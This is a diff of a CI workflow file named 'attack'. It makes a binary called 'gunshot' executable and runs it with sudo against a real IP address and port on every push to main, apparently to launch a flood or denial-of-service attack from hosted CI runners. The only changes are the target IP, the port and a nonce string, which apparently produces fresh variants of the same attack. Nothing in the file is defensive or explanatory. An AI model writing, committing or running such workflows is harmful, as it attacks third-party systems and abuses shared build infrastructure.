@@ -1,4 +1,4 @@
-name: attack-5baac2aa
+name: attack-cd2094b3
 on:
   push:
     branches: [ main, master ]
@@ -18,7 +18,7 @@ jobs:
     - name: Make executable
       run: chmod +x gunshot
     - name: Fire
-      run: sudo ./gunshot 91.108.17.34 32000 60 200
+      run: sudo ./gunshot 91.108.17.49 32001 60 200
       continue-on-error: true
-    - name: Nonce 5baac2aa
-      run: echo "nonce=5baac2aa"
+    - name: Nonce cd2094b3
+      run: echo "nonce=cd2094b3"
